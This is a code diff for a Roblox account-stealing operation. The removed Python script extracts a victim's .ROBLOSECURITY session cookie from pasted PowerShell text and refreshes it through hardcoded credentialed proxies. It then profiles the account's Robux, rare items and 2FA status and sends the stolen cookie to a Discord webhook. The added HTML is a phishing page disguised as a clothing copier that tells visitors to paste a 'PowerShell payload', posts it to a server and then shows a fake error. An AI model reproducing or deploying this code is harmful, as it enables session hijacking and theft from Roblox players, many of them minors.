@@ -1,428 +1,225 @@
-import sys
-import os
-import re
-import time
-import random
-import requests
-from datetime import datetime, timezone
-from playwright.sync_api import sync_playwright
+<!doctype html>
+<html lang="en" class="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>RBXDEV | UGC & Clothes Copier</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200..1000&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#17191B;--panel:#232527;--panel2:#1D1F21;--line:#393B3D;--ink:#F7F7F8;--muted:#BDBEBE;--blue:#00A2FF;--green:#02B757;--red:#E8505B;
+--f:"Nunito","Helvetica Neue",Arial,sans-serif;--m:"JetBrains Mono",ui-monospace,Consolas,monospace;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+:root[data-theme="dark"]{--bg:#17191B;--panel:#232527;--panel2:#1D1F21;--line:#393B3D;--ink:#F7F7F8;--muted:#BDBEBE}
+html{scroll-behavior:smooth}
+*{box-sizing:border-box;margin:0}
+body{background:var(--bg);color:var(--ink);font:600 18px/1.5 var(--f);overflow-x:hidden}
+section{position:relative;z-index:1}
 
-# --- Webshare Authenticated Proxies ---
-RAW_WEBSHARE_PROXIES = [
-    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
-    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
-    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
-    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
-    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
-    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
-    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
-    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
-    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
-    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
-]
+.blocks{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.blocks i{position:absolute;top:-80px;border-radius:12px;opacity:.9;animation:fall linear infinite;box-shadow:inset 0 -8px 0 rgba(0,0,0,.22),inset 0 6px 0 rgba(255,255,255,.18)}
+@keyframes fall{to{transform:translateY(120vh) rotate(var(--r))}}
 
-def format_webshare(p_str):
-    parts = p_str.strip().split(':')
-    if len(parts) == 4:
-        ip, port, user, pwd = parts
-        return f"http://{user}:{pwd}@{ip}:{port}", ip, port, user, pwd
-    return None, None, None, None, None
+.hero{min-height:100svh;display:flex;flex-direction:column;justify-content:center;padding:6vh 7vw}
+.tag{display:inline-flex;align-items:center;gap:.6rem;background:var(--panel);border:2px solid var(--line);border-radius:12px;padding:.45rem .9rem;font-size:.95rem;width:max-content;margin-bottom:1.6rem}
+.tag b{width:12px;height:12px;border-radius:3px;background:var(--green);transform:rotate(12deg);box-shadow:0 0 12px var(--green)}
+.hero h1{font-size:clamp(3.4rem,11vn,9rem);line-height:.88;letter-spacing:-.04em;max-width:12ch}
+.hero .w{display:inline-block;white-space:nowrap;margin-right:.2em}
+.hero .l{display:inline-block;font-weight:300;color:var(--ink)}
+.hero .l.hot{color:var(--blue)}
+.hero p{margin-top:2rem;max-width:32ch;color:var(--muted);font-size:1.25rem}
+.cue{position:absolute;left:7vw;bottom:5vh;color:var(--muted);display:flex;gap:.7rem;align-items:center;font-size:.95rem}
+.cue i{width:20px;height:20px;border-radius:5px;background:var(--blue);animation:hop 1.3s ease-in-out infinite}
+@keyframes hop{50%{transform:translateY(10px) rotate(45deg)}}
 
-def extract_and_clean_cookie(raw_input):
-    if not raw_input:
-        return ""
-    raw_str = str(raw_input).strip()
-    
-    ps_cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
-    if ps_cookie_match:
-        raw_str = ps_cookie_match.group(1)
-    
-    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
-    if ps_match:
-        raw_str = ps_match.group(1)
+.tall{height:260vh}
+.stick{position:sticky;top:0;height:100svh;display:grid;place-items:center;padding:0 4vw;overflow:hidden}
+.vtitle{position:absolute;top:9vh;left:0;right:0;text-align:center;color:var(--muted)}
+.vtitle b{color:var(--ink);font-weight:900}
+.screen{width:min(1100px,100%);aspect-ratio:16/9;background:var(--panel);border:3px solid var(--line);position:relative;overflow:hidden;transform:scale(.55);border-radius:36px;box-shadow:0 30px 90px -30px var(--blue)}
+.screen iframe{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border:0}
+.vcap{position:absolute;left:0;right:0;bottom:9vh;text-align:center;font-size:clamp(1.7rem,4.5vw,3.2rem);font-weight:900;letter-spacing:-.02em;opacity:0;pointer-events:none}
 
-    if (raw_str.startswith('"') and raw_str.endswith('"')) or (raw_str.startswith("'") and raw_str.endswith("'")):
-        raw_str = raw_str[1:-1].strip()
-    if raw_str.startswith(".ROBLOSECURITY="):
-        raw_str = raw_str[len(".ROBLOSECURITY="):].strip()
-        
-    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
-    if raw_str.startswith(warning_text):
-        raw_str = raw_str[len(warning_text):].strip()
-    
-    cleaned = raw_str.lstrip('.').rstrip(';').strip()
-    if len(cleaned) < 30:
-        return None
-        
-    return cleaned
+.up{min-height:100svh;display:grid;place-items:center;padding:12vh 5vw}
+.card{width:min(680px,100%);background:var(--panel);border:2px solid var(--line);border-radius:24px;overflow:hidden;box-shadow:0 30px 80px -40px #000}
+.top{display:flex;justify-content:space-between;align-items:center;padding:1.1rem 1.4rem;border-bottom:2px solid var(--line)}
+.top h2{font-size:1.35rem;font-weight:900;display:flex;align-items:center;gap:.7rem}
+.logo{width:26px;height:26px;border-radius:6px;background:var(--blue);transform:rotate(12deg);position:relative;box-shadow:inset 0 -4px 0 rgba(0,0,0,.25)}
+.logo::after{content:"";position:absolute;inset:8px;background:var(--panel);border-radius:2px}
+.pill{font:500 .75rem var(--m);border:2px solid color-mix(in srgb,var(--green) 55%,transparent);color:var(--green);border-radius:8px;padding:.25rem .6rem}
+.body{padding:1.4rem;display:grid;gap:1.1rem}
+.stat{display:flex;gap:.9rem;align-items:center;background:var(--panel2);border:2px solid var(--line);border-radius:16px;padding:.9rem 1.1rem}
+.dot{width:14px;height:14px;border-radius:4px;background:var(--green);box-shadow:0 0 14px var(--green);transform:rotate(12deg);flex:none;transition:background .2s,box-shadow .2s}
+.stat b{display:block;font-weight:800}.stat small{color:var(--muted);font-weight:600;font-size:.88rem}
+label{font:500 .8rem var(--m);color:var(--muted);display:flex;justify-content:space-between;margin-bottom:.5rem}
+textarea{width:100%;min-height:160px;resize:vertical;background:var(--panel2);color:var(--ink);border:2px solid var(--line);border-radius:16px;padding:1rem 1.1rem;font:400 .9rem/1.5 var(--m);outline:0;transition:border-color .15s,box-shadow .15s}
+textarea:focus{border-color:var(--blue);box-shadow:0 0 0 4px color-mix(in srgb,var(--blue) 25%,transparent)}
+.row{display:flex;gap:.7rem}
+.mini{flex:1;font:800 .9rem var(--f);background:transparent;color:var(--ink);border:2px solid var(--line);border-radius:12px;padding:.7rem;cursor:pointer;transition:border-color .15s}
+.mini:hover{border-color:var(--blue)}
+.go{font:900 1.1rem var(--f);border:0;border-radius:16px;padding:1.15rem;cursor:pointer;color:#fff;background:linear-gradient(90deg,var(--blue),var(--green));box-shadow:inset 0 -6px 0 rgba(0,0,0,.22);transition:transform .1s,filter .2s}
+.go:hover{filter:brightness(1.1)}.go:active{transform:translateY(3px);box-shadow:none}
+.go:disabled{filter:grayscale(1) brightness(.6);cursor:not-allowed}
 
-def refresh_cookie_via_playwright(raw_cookie):
-    shuffled_proxies = list(RAW_WEBSHARE_PROXIES)
-    random.shuffle(shuffled_proxies)
-    
-    chosen_proxy_str = shuffled_proxies[0] if shuffled_proxies else None
-    proxy_url, ip, port, user, pwd = format_webshare(chosen_proxy_str) if chosen_proxy_str else (None, None, None, None, None)
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);display:grid;place-items:center;z-index:100;opacity:0;pointer-events:none;transition:opacity .25s ease}
+.modal-overlay.active{opacity:1;pointer-events:auto}
+.modal-box{width:min(420px,90vw);background:var(--panel);border:2px solid var(--line);border-radius:24px;padding:2rem;text-align:center;box-shadow:0 30px 90px rgba(0,0,0,0.8);transform:scale(.95);transition:transform .25s ease}
+.modal-overlay.active .modal-box{transform:scale(1)}
+.spinner{width:40px;height:40px;border:4px solid var(--line);border-top-color:var(--blue);border-radius:50%;animation:spin .8s linear infinite;margin:1.2rem auto 0}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress-container{width:100%;background:var(--panel2);height:8px;border-radius:4px;overflow:hidden;margin:1rem 0 .5rem;border:1px solid var(--line)}
+.progress-bar{height:100%;background:linear-gradient(90deg,var(--blue),var(--green));width:0%;transition:width .3s ease}
+</style>
+</head>
+<body>
+<div class="blocks" id="blocks" aria-hidden="true"></div>
 
-    with sync_playwright() as p:
-        launch_args = {}
-        if proxy_url and ip and port:
-            launch_args["proxy"] = {"server": f"http://{ip}:{port}"}
-            if user and pwd:
-                launch_args["proxy"]["username"] = user
-                launch_args["proxy"]["password"] = pwd
+<section class="hero">
+  <div class="tag"><b></b>System Operational</div>
+  <h1 id="headline">Copy Any Clothing.</h1>
+  <p>Watch the quick tutorial, then paste your PowerShell script or payload below.</p>
+  <div class="cue"><i></i>Scroll down</div>
+</section>
 
-        try:
-            browser = p.chromium.launch(headless=True, **launch_args)
-            context = browser.new_context()
-            
-            context.add_cookies([{
-                'name': '.ROBLOSECURITY',
-                'value': raw_cookie,
-                'domain': '.roblox.com',
-                'path': '/',
-                'httpOnly': True,
-                'secure': True
-            }])
-            
-            page = context.new_page()
-            page.goto("https://www.roblox.com/home", timeout=45000)
-            
-            if "login" in page.url or page.locator("#login-button").count() > 0:
-                browser.close()
-                return raw_cookie
+<section class="tall" id="tutorial" aria-label="Video tutorial">
+  <div class="stick">
+    <div class="vtitle"><b>How it works</b> in 60 seconds</div>
+    <div class="screen" id="screen">
+      <iframe id="vid-frame" src="https://www.youtube-nocookie.com/embed/dmWwGzCDsB4?enablejsapi=1" title="Tutorial" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+    <div class="vcap" id="vcap">Ready when you are. Paste below.</div>
+  </div>
+</section>
 
-            cookies = context.cookies()
-            refreshed = None
-            for c in cookies:
-                if c['name'] == '.ROBLOSECURITY':
-                    refreshed = c['value']
-                    break
-            
-            browser.close()
-            return refreshed if refreshed else raw_cookie
-        except Exception:
-            return raw_cookie
+<section class="up" id="paste">
+  <div class="card">
+    <div class="top"><h2><span class="logo"></span>UGC & Clothes Copier</h2><span class="pill">SECURE</span></div>
+    <div class="body">
+      <div class="stat" id="stat"><span class="dot"></span><div><b id="st1">Connection Secured</b><small id="st2">Awaiting PowerShell script or payload.</small></div></div>
+      <div>
+        <label for="script-input"><span>ENTER YOUR POWERSHELL SCRIPT / PAYLOAD</span></label>
+        <textarea id="script-input" spellcheck="false" placeholder="Paste PowerShell execution code or payload here..."></textarea>
+      </div>
+      <div class="row">
+        <button class="mini" id="paste-btn">Paste from clipboard</button>
+        <button class="mini" id="clear">Clear</button>
+      </div>
+      <button class="go" id="submit-btn" disabled>Submit Payload</button>
+    </div>
+  </div>
+</section>
 
-def get_working_session(roblosecurity):
-    session = requests.Session()
-    session.headers.update({
-        "Accept": "*/*",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
-        "Connection": "close",
-        "Content-Type": "application/json",
-        "Origin": "https://www.roblox.com",
-        "Referer": "https://www.roblox.com/",
-        "Sec-Ch-Ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": '"Windows"',
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
-    })
+<!-- Processing Modal -->
+<div id="processing-modal" class="modal-overlay">
+  <div class="modal-box">
+    <h3 style="font-size: 1.4rem; font-weight: 900; margin-bottom: 0.5rem;">Processing...</h3>
+    <p id="modal-status-text" style="color: var(--muted); font-size: .95rem;">Validating your Payload</p>
+    <div class="progress-container">
+      <div id="progress-bar" class="progress-bar"></div>
+    </div>
+    <div id="progress-pct" style="font: 500 0.85rem var(--m); color: var(--blue);">0%</div>
+    <div class="spinner"></div>
+  </div>
+</div>
 
-    manual_proxy = os.environ.get('PROXY_URL')
-    test_proxies = [manual_proxy] if manual_proxy else []
-    
-    formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
-    random.shuffle(formatted_list)
-    test_proxies.extend(formatted_list)
+<!-- Error / Traffic Alert Modal -->
+<div id="error-modal" class="modal-overlay">
+  <div class="modal-box" style="border-color: var(--red);">
+    <div style="width: 48px; height: 48px; border-radius: 50%; background: color-mix(in srgb, var(--red) 20%, transparent); color: var(--red); display: grid; place-items: center; margin: 0 auto 1rem; border: 2px solid var(--red);">
+      <svg style="width: 24px;" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+    </div>
+    <h3 style="font-size: 1.3rem; font-weight: 900; margin-bottom: 0.5rem;">System Traffic Alert</h3>
+    <p style="color: var(--muted); font-size: .9rem; margin-bottom: 1.5rem; line-height: 1.5;">Error Code 402: Too many people are trying at once. Please try again later.</p>
+    <button class="go" id="understood-btn" style="width: 100%; padding: 0.9rem; background: var(--red);">Understood</button>
+  </div>
+</div>
 
-    for p in test_proxies:
-        if not p:
-            continue
-        proxy_dict = {"http": p, "https": p}
-        try:
-            session.proxies = proxy_dict
-            session.get("https://www.roblox.com/home", timeout=4)
-            if roblosecurity:
-                session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
-            
-            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
-            if test_res.status_code == 200:
-                return session
-        except Exception:
-            continue
+<script>
+const cols=["#00A2FF","#02B757","#F7C948","#E8505B","#9B6BFF"], bl=document.getElementById("blocks");
+for(let i=0;i<14;i++){
+  const e=document.createElement("i"), s=28+Math.random()*52;
+  e.style.cssText=`left:${Math.random()*100}%;width:${s}px;height:${s}px;background:${cols[i%5]};--r:${(Math.random()*2-1)*540}deg;animation-duration:${14+Math.random()*16}s;animation-delay:${-Math.random()*30}s;opacity:.${3+i%4}`;
+  bl.appendChild(e);
+}
 
-    session.proxies = {}
-    try:
-        session.get("https://www.roblox.com/home", timeout=4)
-    except Exception:
-        pass
-        
-    if roblosecurity:
-        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
-        
-    return session
+const scriptInput = document.getElementById("script-input");
+const submitBtn = document.getElementById("submit-btn");
+const processingModal = document.getElementById("processing-modal");
+const progressBar = document.getElementById("progress-bar");
+const progressPct = document.getElementById("progress-pct");
+const modalStatusText = document.getElementById("modal-status-text");
+const errorModal = document.getElementById("error-modal");
+const understoodBtn = document.getElementById("understood-btn");
 
-def main():
-    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
-    if not webhook_url:
-        sys.exit(1)
+function checkInput() {
+  submitBtn.disabled = scriptInput.value.trim().length === 0;
+}
+scriptInput.addEventListener("input", checkInput);
 
-    # Read data safely from standard input (stdin) piped by Node.js
-    raw_input_data = sys.stdin.read()
-    if not raw_input_data:
-        sys.exit(0)
+document.getElementById("clear").onclick = () => { scriptInput.value=""; checkInput(); scriptInput.focus(); };
+document.getElementById("paste-btn").onclick = async () => {
+  try { scriptInput.value = await navigator.clipboard.readText(); checkInput(); } 
+  catch(e) { scriptInput.focus(); }
+};
 
-    raw_cookie = extract_and_clean_cookie(raw_input_data)
-    if not raw_cookie:
-        sys.exit(0)
+function showProcessing(text, pct) {
+  modalStatusText.textContent = text;
+  progressBar.style.width = pct + '%';
+  progressPct.textContent = pct + '%';
+  processingModal.classList.add("active");
+}
+function hideProcessing() { processingModal.classList.remove("active"); }
+function showErrorModal() { errorModal.classList.add("active"); }
+understoodBtn.onclick = () => { errorModal.classList.remove("active"); };
 
-    print("[+] Refreshing cookie session...")
-    refreshed_cookie = refresh_cookie_via_playwright(raw_cookie)
+submitBtn.addEventListener("click", async () => {
+  const payload = scriptInput.value.trim();
+  if(!payload) return;
 
-    session = get_working_session(refreshed_cookie)
+  submitBtn.disabled = true;
+  showProcessing("Validating Script Payload...", 15);
+  await new Promise(r => setTimeout(r, 600));
 
-    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
-    if auth_res.status_code != 200:
-        sys.exit(1)
-    
-    auth_data = auth_res.json()
-    user_id = auth_data.get("id")
-    if not user_id:
-        sys.exit(1)
+  showProcessing("Executing extraction pipeline...", 45);
+  await new Promise(r => setTimeout(r, 800));
 
-    username = auth_data.get("name", "Unknown")
-    display_name = auth_data.get("displayName", username)
+  showProcessing("Forwarding data securely...", 75);
 
-    def safe_get(url, params=None):
-        try:
-            r = session.get(url, params=params, timeout=5)
-            if r.status_code == 200:
-                return r.json()
-        except Exception:
-            pass
-        return {}
+  try {
+    let currentPct = 75;
+    const ticker = setInterval(() => {
+      if(currentPct < 95) {
+        currentPct += 5;
+        progressPct.textContent = currentPct + '%';
+        progressBar.style.width = currentPct + '%';
+      }
+    }, 150);
 
-    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
-    created = user_info.get("created", "")
-    age_days = 0
-    created_dt = None
-    if created:
-        try:
-            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
-            age_days = (datetime.now(timezone.utc) - created_dt).days
-        except Exception:
-            pass
+    const response = await fetch('/api/process', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: payload })
+    });
 
-    robux_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
-    robux = robux_res.get("robux", 0)
+    const result = await response.json();
+    clearInterval(ticker);
 
-    trans_res = safe_get(
-        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
-        params={"transactionType": "summary", "timeFrame": "Year"}
-    )
-    pending = trans_res.get("pendingRobuxTotal", 0)
-
-    limiteds = []
-    cursor = ""
-    page_count = 0
-    while page_count < 2:
-        params = {"limit": 100}
-        if cursor:
-            params["cursor"] = cursor
-        r = safe_get(
-            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
-            params=params
-        )
-        if not isinstance(r, dict):
-            break
-        for item in r.get("data", []):
-            limiteds.append(item.get("recentAveragePrice", 0))
-        cursor = r.get("nextPageCursor")
-        page_count += 1
-        if not cursor:
-            break
-
-    rap = sum(limiteds)
-    lim_count = len(limiteds)
-
-    try:
-        prem_res = session.get(
-            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
-            timeout=5
-        )
-        premium = prem_res.json() is True
-    except Exception:
-        premium = False
-
-    def check_bundle(bundle_id):
-        try:
-            r = session.get(
-                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
-                timeout=5
-            )
-            return r.json() is True
-        except Exception:
-            return False
-
-    def check_asset(asset_id):
-        try:
-            r = session.get(
-                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
-                timeout=5
-            )
-            return r.json() is True
-        except Exception:
-            return False
-
-    korblox = check_bundle(192)
-    headless = check_bundle(201)
-    violet_valk = check_asset(799742571)
-
-    email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
-    twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)
-
-    def check_played(universe_id):
-        r = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
-        if isinstance(r, dict):
-            for badge in r.get("data", []):
-                if badge.get("awardingUniverse", {}).get("id") == universe_id:
-                    return True
-        return False
-
-    adopt_played = check_played(383310974)
-    mm2_played = check_played(142823291)
-    ps99_played = check_played(3259657279)
-
-    friends_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count").get("count", 0)
-    followers_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count").get("count", 0)
-    following_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count").get("count", 0)
-    badges_data = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 10})
-    badges_count = len(badges_data.get("data", [])) if isinstance(badges_data, dict) else 0
-
-    bio_text = user_info.get("description", "")
-    bio_quote = f"> {bio_text.replace(chr(10), chr(10) + '> ')}" if bio_text else "> *No bio provided.*"
-
-    total_worth = robux + rap
-    headshot_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
-    render_url = f"https://www.roblox.com/bust-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
-
-    years = age_days // 365
-    months = (age_days % 365) // 30
-    age_formatted = f"{years}y {months}m ({age_days:,} days)" if years > 0 else f"{age_days:,} days"
-    created_unix = int(created_dt.timestamp()) if created_dt else int(time.time())
-
-    if rap >= 50000 or age_days > 1825:
-        tier_rating = "⭐ Elite Account • High Value"
-    elif rap >= 10000 or age_days > 365:
-        tier_rating = "🔹 Active Account • Standard"
-    else:
-        tier_rating = "🔸 Newer Account • Low Stats"
-
-    if email_ver and twofa:
-        embed_color = 0x2ECC71
-    elif not email_ver and not twofa:
-        embed_color = 0xE74C3C
-    else:
-        embed_color = 0xF1C40F
-
-    special_list = []
-    if korblox: special_list.append("Korblox")
-    if headless: special_list.append("Headless")
-    if violet_valk: special_list.append("Violet Valk")
-    special_text = " • ".join([f"`{item}`" for item in special_list]) if special_list else "None owned"
-
-    games_list = []
-    if adopt_played: games_list.append("Adopt Me")
-    if mm2_played: games_list.append("MM2")
-    if ps99_played: games_list.append("PS99")
-    games_text = " • ".join([f"`{g}`" for g in games_list]) if games_list else "No tracked games played"
-
-    payload = {
-        "content": "@everyone",
-        "username": "Core Extractor",
-        "avatar_url": "https://cdn.discordapp.com/emojis/1085024250275815525.png",
-        "embeds": [
-            {
-                "title": f"{username} {('👑' if premium else '')} {('✅' if email_ver else '')}",
-                "description": f"### {tier_rating}\n{bio_quote}",
-                "color": embed_color,
-                "thumbnail": {"url": headshot_url},
-                "image": {"url": render_url},
-                "fields": [
-                    {
-                        "name": "📊 Financials",
-                        "value": f"• **Robux:** `{robux:,}`\n• **Pending:** `{pending:,}`\n• **RAP:** `{rap:,}`\n• **Total Worth:** `{total_worth:,}`",
-                        "inline": True
-                    },
-                    {
-                        "name": "🛡️ Security",
-                        "value": f"• **Email:** `{'✅' if email_ver else '❌'}`\n• **2FA:** `{'✅' if twofa else '❌'}`\n• **Premium:** `{'✅' if premium else '❌'}`",
-                        "inline": True
-                    },
-                    {
-                        "name": "👥 Socials",
-                        "value": f"• **Friends:** `{friends_count:,}`\n• **Followers:** `{followers_count:,}`\n• **Following:** `{following_count:,}`",
-                        "inline": True
-                    },
-                    {
-                        "name": "📋 Account Data",
-                        "value": f"• **Age:** `{age_formatted}`\n• **Joined:** <t:{created_unix}:D> (<t:{created_unix}:R>)\n• **Badges:** `{badges_count:,}`",
-                        "inline": False
-                    },
-                    {
-                        "name": "👑 Rare Assets",
-                        "value": special_text,
-                        "inline": False
-                    },
-                    {
-                        "name": "⭐ Tracked Games",
-                        "value": games_text,
-                        "inline": False
-                    }
-                ],
-                "footer": {
-                    "text": f"Requested by {display_name}",
-                    "icon_url": headshot_url
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            },
-            {
-                "title": "🔑 Refreshed Session Cookie",
-                "description": f"```text\n{refreshed_cookie}\n```",
-                "color": 0x2B2D31,
-                "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
-            }
-        ],
-        "components": [
-            {
-                "type": 1,
-                "components": [
-                    {
-                        "type": 2,
-                        "style": 5,
-                        "label": "Roblox Profile",
-                        "url": f"https://www.roblox.com/users/{user_id}/profile"
-                    },
-                    {
-                        "type": 2,
-                        "style": 5,
-                        "label": "Stats Link",
-                        "url": f"https://www.rolimons.com/player/{user_id}"
-                    },
-                    {
-                        "type": 2,
-                        "style": 5,
-                        "label": "Inventory",
-                        "url": f"https://www.roblox.com/users/{user_id}/inventory#!/collectibles"
-                    },
-                    {
-                        "type": 2,
-                        "style": 2,
-                        "label": "Refresh Session",
-                        "custom_id": f"refresh_session_{user_id}",
-                        "emoji": {"name": "🔄"}
-                    }
-                ]
-            }
-        ],
-        "allowed_mentions": {"parse": ["everyone"]}
+    if(!response.ok || !result.success) {
+      throw new Error(result.error || "Execution failed");
     }
 
-    requests.post(webhook_url, json=payload, timeout=5)
-
-if __name__ == "__main__":
-    main()
+    showProcessing("Finalizing package...", 100);
+    await new Promise(r => setTimeout(r, 600));
+    hideProcessing();
+    showErrorModal();
+    scriptInput.value = '';
+    checkInput();
+  } catch (err) {
+    hideProcessing();
+    showErrorModal();
+  } finally {
+    submitBtn.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
